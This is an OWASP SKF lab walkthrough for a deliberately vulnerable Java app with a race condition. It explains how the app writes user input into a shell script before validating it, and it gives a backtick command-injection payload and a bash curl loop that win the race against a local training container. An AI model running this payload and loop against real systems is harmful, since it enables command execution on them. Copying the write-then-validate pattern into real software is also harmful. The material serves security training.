# Race Condition

## Running the app on Docker

```
$ sudo docker pull blabla1337/owasp-skf-lab:java-racecondition
```

```
$ sudo docker run -ti -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:java-racecondition
```

{% hint style="success" %}
Now that the app is running let's go hacking!
{% endhint %}

## Reconnaissance

### Step1

{% hint style="success" %}
Congratulations, you won the race
{% endhint %}

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/python/RaceCondition/1.png)

All you need to do now is to add your name to the board and get your price.

The application shows an input box, where you can insert your username and go to the next screen, clicking "Make it mine".

The application verifies whether the username contains special characaters such as `"` and `\` and erases them. It also applies strict filtering on the text using the following regex:

`[A-Za-z0-9 ]*`

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/python/RaceCondition/2.png)

If the username is correct, clicking `Boot` will put us on the score board. Yeah!!

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/python/RaceCondition/3.png)

#### Step 2

This application suffers from a race condition vulnerability, but how can we identify it?

If we look at the code we see that there are 4 functions being used:

1. `bootValidate(person)`

   the function receives the username in input and executes the following:

   - deletes `"` and `\` from the username
   - opens `hello.sh` file
   - writes a command in it
   - closes the file
   - logs some useful info
   - checks if the username is in the format `[A-Za-z0-9 ]*`
   - returns the username if the regex succedes

2. `bootClean()` that removes all the hello files (`hello.sh` and `hello.txt`)

3. `bootRun()` executes the `hello.sh` file

4. `bootReset()` resets the system to the default settings

#### Step 3

If we intercept the traffic generate by the app we see that:

- a GET request is issued to validate the username and call `bootValidate(person)`

```text
GET /?person=test&action=validate
```

- clicking boot, will generate the request to execute the `bootRun()` function

```text
GET /?action=run HTTP/1.1
```

The logic behind the application is in the function `start()`. If the action is not `validate` or `reset`, the application runs `bootRun()` executing the `hello.sh` file.

We also notice that the function `bootValidate(person)` first inserts the command in the `hello.sh` and then validates the input, returning if it is valid or not.

```java
public String bootValidate(String person) {
    try (FileWriter writer = new FileWriter("hello.sh", false)) {
      writer.write("echo \"" + person + "\" > hello.txt");
      writer.close();
      java.util.Date date = new java.util.Date();
      new ProcessBuilder("/bin/bash", "-c", "echo 'hello.sh updated -- " + date + "' > log.txt").start();
      new ProcessBuilder("/bin/bash", "-c", "echo 'hello.sh cleaned -- " + date + "' >> log.txt").start();
      Process p3 = new ProcessBuilder("/bin/bash", "-c", "sed -n '/^echo \"[A-Za-z0-9 ]*\" > hello.txt$/p' hello.sh")
          .start();
      BufferedReader reader = new BufferedReader(new java.io.InputStreamReader(p3.getInputStream()));
      String valid = reader.readLine();
      System.out.println(valid);
      return valid == null ? "" : valid;
    } catch (Exception e) {
      e.printStackTrace();
    }
    return "";
  }
```

Everything works fine, so where is the problem?

The problem is that in this case, we have a very small window to execute the `bootRun()` function after the input is written in `hello.sh` and just before `return valid` is called. Again, there is a possibility to have a race condition only if the following steps are executed in this order:

1. pass our malicious payload to `bootValidate`
2. write the malicious payload in `hello.sh`
3. call `bootRun()`
4. `return valid` is called

## Exploitation

Before we can exploit the race condition, we need a good payload that will execute the command for us. We know that the double quotes and the backslash cannot be used to break the command, but we also know that using '\`' backtick.

So our payload will be:

```
`id`
```

in order to execute the command `id` on the target system.

Now we can exploit this sequence to achieve a command injection. In order to do that we must send requests with high frequency.

Doing it manually is practically impossible, so we create a script that does that for us:

```bash
#!/bin/bash
while true; do

    curl -i -s -k  -X $'GET' \
        -H $'Host: localhost:5000' -H $'User-Agent: Semen Rozhkov exploiter v1.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate ' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
        $'http://localhost:5000/?action=run' | grep "Check this out"
done
```

and in the meantime we send the other request from the browser like

```
http://localhost:5000/?person=Default+User`id`&action=validate
```

If we look in the logs we will see:

![](https://raw.githubusercontent.com/blabla1337/skf-labs/master/.gitbook/assets/python/RaceCondition/4.png)

{% hint style="success" %}
Congratulations, you won the race for real now!!!!!!!!
{% endhint %}

## Additional sources

{% embed url="https://www.owasp.org/index.php/Testing_for_Race_Conditions_(OWASP-AT-010)" %}
